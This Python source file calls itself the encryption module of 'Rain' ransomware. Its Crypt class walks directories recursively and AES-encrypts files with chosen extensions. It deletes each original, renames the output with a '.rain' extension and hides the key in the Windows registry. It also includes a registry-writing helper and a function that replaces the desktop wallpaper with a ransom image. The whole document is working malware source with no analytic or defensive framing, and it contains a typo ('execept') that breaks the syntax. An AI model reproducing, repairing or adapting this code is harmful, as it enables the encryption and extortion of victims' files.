#!/usr/bin/env python
# Rain's encryption functions
# Developed by WillRazorFace

from Crypto.Cipher import AES
from Crypto.Random import new
from os.path import splitext, getsize
from os import remove
from shutil import copyfile
from ctypes import windll
from winreg import *
from glob import iglob
from bitstring import BitArray
from struct import pack


class Crypt:
    def __init__(self,
                 key: bytes,
                 extensions: list,
                 background: str,
                 out_ext='.rain',
                 ransom_name='Rain'):
        self.key = key
        self.out_ext = out_ext
        self.extensions = extensions
        self.ransom_name = ransom_name
        self.background = background
        self.save_randomkey()

    def crypt_file(self, file: str, chunksize=64*2048):
        # Encrypt a file using AES CBC MODE with the given key
        out_file = splitext(file)[0] + self.out_ext
        ext = (splitext(file)[1].strip('.') + '.').encode()
        fsz = getsize(file)
        iv = new().read(AES.block_size)
        encryptor = AES.new(self.key, AES.MODE_CBC, iv)

        with open(out_file, 'wb') as encrypted:
            encrypted.write(ext)
            encrypted.write(pack('<Q', fsz))
            encrypted.write(iv)
            with open(file, 'rb') as original:
                while True:
                    data = original.read(chunksize)
                    n = len(data)
                    if n == 0:
                        break
                    elif n % 16 != 0:
                        data += b' ' * (16 - n % 16)
                    dataenc = encryptor.encrypt(data)
                    encrypted.write(dataenc)
        remove(file)
        return 0

    def change_background(self, appdata: str):
        # Change the user's desktop background and stores the old in Themes folder
        src = appdata+'/Microsoft/Windows/Themes/TranscodedWallpaper'
        dst = appdata+'/Microsoft/Windows/Themes/OldTranscodedWallpaper'
        try:
            copyfile(src, dst)
        execept FileNotFoundError:
            pass
        windll.user32.SystemParametersInfoW(20, 0, self.background, 0)
        return 0

    def save_randomkey(self):
        # Saves the given key (converted to binary) in a Windows registry
        binkey = BitArray(hex=self.key.hex()).bin
        winkey = CreateKey(HKEY_LOCAL_MACHINE, '')
        try:
            SetValueEx(winkey, ' ', 0, REG_SZ, binkey)
        except PermissionError:
            winkey = CreateKey(HKEY_CURRENT_USER, '')
            SetValueEx(winkey, ' ', 0, REG_SZ, binkey)
        return 0

    def registry_key(self, keypath: str, value, name: str):
        # Registry a key in Windows registry using the keypath and the value provided
        key = CreateKey(HKEY_LOCAL_MACHINE, keypath)
        try:
            SetValueEx(key, name, 0, REG_SZ, value)
            CloseKey(key)
        except PermissionError:
            key = CreateKey(HKEY_CURRENT_USER, keypath)
            SetValueEx(key, name, 0, REG_SZ, value)
            CloseKey(key)
        return 0

    def crypt_directory(self, dir: str):
        # Crypt a entire directory and its sub-directorys
        for extension in self.extensions:
            filetree = iglob(dir + '/**/*' + extension, recursive=True)
            for file in filetree:
                self.crypt_file(file)
        return 0
